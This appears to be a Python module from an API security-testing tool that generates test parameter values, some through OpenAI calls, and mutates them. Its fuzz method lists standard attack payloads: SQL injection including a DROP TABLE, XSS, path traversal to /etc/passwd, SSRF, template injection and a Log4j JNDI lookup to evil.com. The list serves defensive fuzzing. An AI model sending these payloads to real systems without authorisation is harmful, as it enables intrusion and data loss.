"""
Parameter placeholder utility for generating realistic test values
"""

import re
import json
import logging
from typing import Dict, List, Any, Optional
from datetime import datetime, timedelta
import openai
from app.config import Config

logger = logging.getLogger(__name__)

class ParameterGenerator:
    """Generate realistic parameter values for API testing"""
    
    def __init__(self, openai_api_key: str = None):
        self.openai_api_key = openai_api_key or Config.OPENAI_API_KEY
        self.openai_model = Config.OPENAI_MODEL
        
        if self.openai_api_key:
            openai.api_key = self.openai_api_key
    
    def generate_parameter_values(self, endpoint: Dict, use_ai: bool = True) -> Dict:
        """
        Generate parameter values for an endpoint
        
        Args:
            endpoint: Endpoint information with parameters and request body
            use_ai: Whether to use OpenAI for complex parameters
            
        Returns:
            Dictionary of parameter values
        """
        param_values = {}
        
        # Generate path parameters
        parameters_schema = endpoint.get('parameters_schema')
        if parameters_schema:
            # Handle different formats of parameters_schema
            if isinstance(parameters_schema, list):
                # Standard OpenAPI format
                for param in parameters_schema:
                    if isinstance(param, dict) and param.get('in') == 'path':
                        param_name = param.get('name', '')
                        if param_name:
                            param_values[param_name] = self._generate_value_for_parameter(param, use_ai)
            elif isinstance(parameters_schema, dict):
                # Alternative format - try to extract parameters
                logger.warning(f"⚠️  parameters_schema is dict, not list: {type(parameters_schema)}")
                # For now, skip parameter generation for this format
        
        # Generate query parameters
        if parameters_schema:
            if isinstance(parameters_schema, list):
                # Standard OpenAPI format
                for param in parameters_schema:
                    if isinstance(param, dict) and param.get('in') == 'query':
                        param_name = param.get('name', '')
                        if param_name:
                            param_values[param_name] = self._generate_value_for_parameter(param, use_ai)
        
        # Generate request body
        request_body_schema = endpoint.get('request_body_schema')
        if request_body_schema:
            # Create endpoint context for AI
            endpoint_context = f"Endpoint: {endpoint.get('path', '')} {endpoint.get('method', '')}"
            if endpoint.get('summary'):
                endpoint_context += f" - {endpoint['summary']}"
            if endpoint.get('description'):
                endpoint_context += f" - {endpoint['description']}"
            
            try:
                body_values = self._generate_request_body(request_body_schema, use_ai, endpoint_context)
                if body_values:
                    param_values['request_body'] = body_values
            except Exception as e:
                logger.warning(f"⚠️  Failed to generate request body: {e}")
                # Continue without request body
        
        return param_values
    
    def _generate_value_for_parameter(self, param: Dict, use_ai: bool = True) -> Any:
        """
        Generate a value for a specific parameter
        
        Args:
            param: Parameter definition
            use_ai: Whether to use OpenAI for complex parameters
            
        Returns:
            Generated value
        """
        param_name = param.get('name', '')
        param_type = self._get_parameter_type(param)
        param_format = param.get('format', '')
        param_enum = param.get('enum')
        param_description = param.get('description', '')
        
        # Use enum values if available
        if param_enum:
            return param_enum[0] if param_enum else None
        
        # Generate based on type and format
        if param_type == 'string':
            return self._generate_string_value(param_name, param_format, param_description, use_ai)
        elif param_type == 'integer':
            return self._generate_integer_value(param_name, param_format, param_description)
        elif param_type == 'number':
            return self._generate_number_value(param_name, param_format, param_description)
        elif param_type == 'boolean':
            return True
        elif param_type == 'array':
            return self._generate_array_value(param, use_ai)
        elif param_type == 'object':
            return self._generate_object_value(param, use_ai)
        else:
            return self._generate_default_value(param_name, param_description, use_ai)
    
    def _get_parameter_type(self, param: Dict) -> str:
        """Extract parameter type from OpenAPI definition"""
        schema = param.get('schema', {})
        return schema.get('type', 'string')
    
    def _generate_ai_value(self, param_name: str, param_format: str, description: str) -> str:
        """Generate value using OpenAI based on parameter context"""
        try:
            prompt = f"""
            Generate a realistic test value for an API parameter with the following details:
            
            Parameter Name: {param_name}
            Format: {param_format}
            Description: {description}
            
            Requirements:
            1. Generate a realistic, valid value that would work in a real API
            2. Consider the parameter name, format, and description
            3. Return only the value, no explanations
            4. Make it suitable for security testing
            
            Examples:
            - For email: user@example.com
            - For phone: +1-555-123-4567
            - For date: 2024-01-15
            - For UUID: 550e8400-e29b-41d4-a716-446655440000
            
            Generate value:
            """
            
            client = openai.OpenAI(api_key=self.openai_api_key)
            response = client.chat.completions.create(
                model=self.openai_model,
                messages=[
                    {"role": "system", "content": "You are an API testing expert. Generate realistic test values for API parameters."},
                    {"role": "user", "content": prompt}
                ],
                max_tokens=50,
                temperature=0.7
            )
            
            value = response.choices[0].message.content.strip()
            # Clean up the response
            value = value.replace('"', '').replace("'", "").strip()
            
            return value if value else None
            
        except Exception as e:
            logger.warning(f"AI generation failed: {e}")
            return None
    
    def _generate_ai_request_body(self, schema: Dict, endpoint_context: str = "") -> Dict:
        """Generate request body using OpenAI based on schema"""
        try:
            schema_str = json.dumps(schema, indent=2)
            
            prompt = f"""
            Generate a realistic JSON request body for an API endpoint with the following schema:
            
            Endpoint Context: {endpoint_context}
            Schema: {schema_str}
            
            Requirements:
            1. Generate a complete, valid JSON object
            2. Use realistic values that would work in a real API
            3. Include all required fields
            4. Make it suitable for security testing
            5. Return only the JSON, no explanations
            
            Generate JSON:
            """
            
            client = openai.OpenAI(api_key=self.openai_api_key)
            response = client.chat.completions.create(
                model=self.openai_model,
                messages=[
                    {"role": "system", "content": "You are an API testing expert. Generate realistic JSON request bodies for API endpoints."},
                    {"role": "user", "content": prompt}
                ],
                max_tokens=500,
                temperature=0.7
            )
            
            json_str = response.choices[0].message.content.strip()
            
            # Try to parse the JSON response
            try:
                # Remove markdown code blocks if present
                if json_str.startswith('```json'):
                    json_str = json_str[7:]
                if json_str.endswith('```'):
                    json_str = json_str[:-3]
                
                return json.loads(json_str)
            except json.JSONDecodeError:
                logger.warning(f"Failed to parse AI-generated JSON: {json_str}")
                return None
            
        except Exception as e:
            logger.warning(f"AI request body generation failed: {e}")
            return None
    
    def _generate_string_value(self, param_name: str, param_format: str, description: str, use_ai: bool) -> str:
        """Generate string value based on parameter name and format"""
        
        # Try AI generation first if available and enabled
        if use_ai and self.openai_api_key:
            try:
                ai_value = self._generate_ai_value(param_name, param_format, description)
                if ai_value:
                    logger.info(f"🤖 AI generated value for {param_name}: {ai_value}")
                    return ai_value
            except Exception as e:
                logger.warning(f"AI generation failed for {param_name}: {e}")
        
        # Fallback to common patterns based on parameter name
        param_lower = param_name.lower()
        
        if 'email' in param_lower:
            return 'test@example.com'
        elif 'phone' in param_lower or 'mobile' in param_lower:
            return '+1234567890'
        elif 'date' in param_lower:
            return datetime.now().strftime('%Y-%m-%d')
        elif 'time' in param_lower:
            return datetime.now().strftime('%H:%M:%S')
        elif 'datetime' in param_lower or 'timestamp' in param_lower:
            return datetime.now().isoformat()
        elif 'url' in param_lower or 'uri' in param_lower:
            return 'https://example.com'
        elif 'uuid' in param_lower or 'id' in param_lower:
            return '123e4567-e89b-12d3-a456-426614174000'
        elif 'password' in param_lower:
            return 'TestPassword123!'
        elif 'token' in param_lower or 'auth' in param_lower:
            return 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.example'
        elif 'name' in param_lower:
            return 'Test User'
        elif 'title' in param_lower:
            return 'Test Title'
        elif 'description' in param_lower:
            return 'Test description'
        elif 'code' in param_lower:
            return 'TEST123'
        elif 'currency' in param_lower:
            return 'USD'
        elif 'language' in param_lower or 'locale' in param_lower:
            return 'en-US'
        elif 'country' in param_lower:
            return 'US'
        elif 'state' in param_lower or 'province' in param_lower:
            return 'CA'
        elif 'city' in param_lower:
            return 'San Francisco'
        elif 'zip' in param_lower or 'postal' in param_lower:
            return '94105'
        elif 'address' in param_lower:
            return '123 Test Street'
        elif 'sku' in param_lower:
            return 'SKU123456'
        elif 'order' in param_lower:
            return 'ORD123456'
        elif 'product' in param_lower:
            return 'PROD123456'
        elif 'customer' in param_lower:
            return 'CUST123456'
        elif 'user' in param_lower:
            return 'USER123456'
        elif 'file' in param_lower or 'filename' in param_lower:
            return 'test.txt'
        elif 'path' in param_lower:
            return '/test/path'
        elif 'query' in param_lower or 'search' in param_lower:
            return 'test query'
        elif 'sort' in param_lower:
            return 'asc'
        elif 'filter' in param_lower:
            return 'active'
        elif 'status' in param_lower:
            return 'active'
        elif 'type' in param_lower:
            return 'test'
        elif 'category' in param_lower:
            return 'test-category'
        elif 'tag' in param_lower:
            return 'test-tag'
        elif 'color' in param_lower:
            return '#FF0000'
        elif 'size' in param_lower:
            return 'M'
        elif 'weight' in param_lower:
            return '1.5'
        elif 'price' in param_lower or 'amount' in param_lower or 'cost' in param_lower:
            return '99.99'
        elif 'quantity' in param_lower or 'count' in param_lower:
            return '1'
        elif 'limit' in param_lower:
            return '10'
        elif 'offset' in param_lower or 'page' in param_lower:
            return '0'
        elif 'version' in param_lower:
            return '1.0.0'
        elif 'format' in param_lower:
            return 'json'
        elif 'encoding' in param_lower:
            return 'utf-8'
        elif 'content' in param_lower:
            return 'application/json'
        elif 'header' in param_lower:
            return 'X-Test-Header'
        elif 'param' in param_lower:
            return 'test_param'
        else:
            # Use AI for complex cases
            if use_ai and self.openai_api_key:
                return self._generate_with_ai(param_name, description, 'string')
            else:
                return 'test_value'
    
    def _generate_integer_value(self, param_name: str, param_format: str, description: str) -> int:
        """Generate integer value"""
        param_lower = param_name.lower()
        
        if 'id' in param_lower:
            return 12345
        elif 'limit' in param_lower:
            return 10
        elif 'offset' in param_lower or 'page' in param_lower:
            return 0
        elif 'quantity' in param_lower or 'count' in param_lower:
            return 1
        elif 'year' in param_lower:
            return datetime.now().year
        elif 'month' in param_lower:
            return datetime.now().month
        elif 'day' in param_lower:
            return datetime.now().day
        elif 'hour' in param_lower:
            return datetime.now().hour
        elif 'minute' in param_lower:
            return datetime.now().minute
        elif 'second' in param_lower:
            return datetime.now().second
        elif 'timestamp' in param_lower:
            return int(datetime.now().timestamp())
        else:
            return 42
    
    def _generate_number_value(self, param_name: str, param_format: str, description: str) -> float:
        """Generate number value"""
        param_lower = param_name.lower()
        
        if 'price' in param_lower or 'amount' in param_lower or 'cost' in param_lower:
            return 99.99
        elif 'weight' in param_lower:
            return 1.5
        elif 'height' in param_lower:
            return 175.5
        elif 'width' in param_lower:
            return 100.0
        elif 'length' in param_lower:
            return 200.0
        elif 'rating' in param_lower or 'score' in param_lower:
            return 4.5
        elif 'percentage' in param_lower or 'rate' in param_lower:
            return 0.15
        elif 'latitude' in param_lower:
            return 37.7749
        elif 'longitude' in param_lower:
            return -122.4194
        else:
            return 42.0
    
    def _generate_array_value(self, param: Dict, use_ai: bool) -> List:
        """Generate array value"""
        schema = param.get('schema', {})
        items_schema = schema.get('items', {})
        
        # Generate 1-3 items for the array
        array_length = min(3, schema.get('maxItems', 3))
        items = []
        
        for _ in range(array_length):
            if items_schema.get('type') == 'string':
                items.append('test_item')
            elif items_schema.get('type') == 'integer':
                items.append(42)
            elif items_schema.get('type') == 'number':
                items.append(42.0)
            elif items_schema.get('type') == 'boolean':
                items.append(True)
            else:
                items.append('test_item')
        
        return items
    
    def _generate_object_value(self, param: Dict, use_ai: bool) -> Dict:
        """Generate object value"""
        schema = param.get('schema', {})
        properties = schema.get('properties', {})
        
        obj = {}
        for prop_name, prop_schema in properties.items():
            # Create a mock parameter for the property
            mock_param = {
                'name': prop_name,
                'schema': prop_schema
            }
            obj[prop_name] = self._generate_value_for_parameter(mock_param, use_ai)
        
        return obj
    
    def _generate_request_body(self, request_body: Dict, use_ai: bool, endpoint_context: str = "") -> Dict:
        """Generate request body values"""
        content = request_body.get('content', {})
        
        # Find JSON content type
        json_content = content.get('application/json', {})
        if not json_content:
            # Try to find any content type
            for content_type, content_schema in content.items():
                if 'json' in content_type or 'xml' in content_type:
                    json_content = content_schema
                    break
        
        if json_content:
            schema = json_content.get('schema', {})
            
            # Try AI generation first if available
            if use_ai and self.openai_api_key:
                try:
                    ai_body = self._generate_ai_request_body(schema, endpoint_context)
                    if ai_body:
                        logger.info(f"🤖 AI generated request body: {json.dumps(ai_body, indent=2)}")
                        return ai_body
                except Exception as e:
                    logger.warning(f"AI request body generation failed: {e}")
            
            # Fallback to schema-based generation
            return self._generate_value_for_schema(schema, use_ai)
        
        return {}
    
    def _generate_value_for_schema(self, schema: Dict, use_ai: bool) -> Any:
        """Generate value for a JSON schema"""
        schema_type = schema.get('type', 'object')
        
        if schema_type == 'string':
            return self._generate_string_value('', '', '', use_ai)
        elif schema_type == 'integer':
            return self._generate_integer_value('', '', '')
        elif schema_type == 'number':
            return self._generate_number_value('', '', '')
        elif schema_type == 'boolean':
            return True
        elif schema_type == 'array':
            return self._generate_array_value({'schema': schema}, use_ai)
        elif schema_type == 'object':
            return self._generate_object_value({'schema': schema}, use_ai)
        else:
            return {}
    
    def _generate_default_value(self, param_name: str, description: str, use_ai: bool) -> str:
        """Generate default value when type is unknown"""
        if use_ai and self.openai_api_key:
            return self._generate_with_ai(param_name, description, 'string')
        else:
            return 'test_value'
    
    def _generate_with_ai(self, param_name: str, description: str, param_type: str) -> str:
        """
        Generate parameter value using OpenAI
        
        Args:
            param_name: Parameter name
            description: Parameter description
            param_type: Parameter type
            
        Returns:
            Generated value
        """
        try:
            prompt = f"""
            Generate a realistic test value for an API parameter with the following details:
            - Parameter name: {param_name}
            - Parameter type: {param_type}
            - Description: {description}
            
            Return only the value, no explanation. For strings, don't include quotes.
            """
            
            client = openai.OpenAI(api_key=self.openai_api_key)
            response = client.chat.completions.create(
                model=self.openai_model,
                messages=[
                    {"role": "system", "content": "You are a helpful assistant that generates realistic test values for API parameters."},
                    {"role": "user", "content": prompt}
                ],
                max_tokens=50,
                temperature=0.7
            )
            
            value = response.choices[0].message.content.strip()
            
            # Clean up the response
            value = value.strip('"\'')
            
            return value if value else 'test_value'
            
        except Exception as e:
            logger.warning(f"Failed to generate value with AI for {param_name}: {e}")
            return 'test_value'
    
    def mutate_parameter_values(self, original_values: Dict, mutation_strategy: str = 'boundary') -> Dict:
        """
        Mutate parameter values for broader test coverage
        
        Args:
            original_values: Original parameter values
            mutation_strategy: Mutation strategy (boundary, fuzz, type_switch)
            
        Returns:
            Mutated parameter values
        """
        mutated_values = original_values.copy()
        
        for param_name, original_value in original_values.items():
            if mutation_strategy == 'boundary':
                mutated_values[param_name] = self._boundary_mutation(param_name, original_value)
            elif mutation_strategy == 'fuzz':
                mutated_values[param_name] = self._fuzz_mutation(param_name, original_value)
            elif mutation_strategy == 'type_switch':
                mutated_values[param_name] = self._type_switch_mutation(param_name, original_value)
        
        return mutated_values
    
    def _boundary_mutation(self, param_name: str, value: Any) -> Any:
        """Apply boundary value testing mutations"""
        if isinstance(value, int):
            if value > 0:
                return 0  # Test boundary
            else:
                return 999999  # Test large value
        elif isinstance(value, float):
            if value > 0:
                return 0.0
            else:
                return 999999.99
        elif isinstance(value, str):
            if len(value) > 0:
                return ""  # Empty string
            else:
                return "A" * 1000  # Very long string
        else:
            return value
    
    def _fuzz_mutation(self, param_name: str, value: Any) -> Any:
        """Apply fuzzing mutations"""
        fuzz_payloads = [
            "' OR '1'='1",  # SQL injection
            "<script>alert('xss')</script>",  # XSS
            "../../../etc/passwd",  # Path traversal
            "http://internal-service",  # SSRF
            "'; DROP TABLE users; --",  # SQL injection
            "<img src=x onerror=alert(1)>",  # XSS
            "{{7*7}}",  # Template injection
            "${jndi:ldap://evil.com/a}",  # Log4j
        ]
        
        if isinstance(value, str):
            return fuzz_payloads[hash(param_name) % len(fuzz_payloads)]
        else:
            return value
    
    def _type_switch_mutation(self, param_name: str, value: Any) -> Any:
        """Apply type switching mutations"""
        if isinstance(value, str):
            return 123  # Switch to integer
        elif isinstance(value, int):
            return "string_value"  # Switch to string
        elif isinstance(value, bool):
            return "true_string"  # Switch to string
        else:
            return value

def generate_test_requests(endpoint: Dict, count: int = 3) -> List[Dict]:
    """
    Generate multiple test requests for an endpoint
    
    Args:
        endpoint: Endpoint information
        count: Number of test requests to generate
        
    Returns:
        List of test request dictionaries
    """
    generator = ParameterGenerator()
    requests = []
    
    # Generate base request
    base_params = generator.generate_parameter_values(endpoint)
    requests.append({
        'name': 'base_test',
        'parameters': base_params,
        'mutation_strategy': 'none'
    })
    
    # Generate mutated requests
    mutation_strategies = ['boundary', 'fuzz', 'type_switch']
    
    for i, strategy in enumerate(mutation_strategies[:count-1]):
        mutated_params = generator.mutate_parameter_values(base_params, strategy)
        requests.append({
            'name': f'{strategy}_test',
            'parameters': mutated_params,
            'mutation_strategy': strategy
        })
    
    return requests
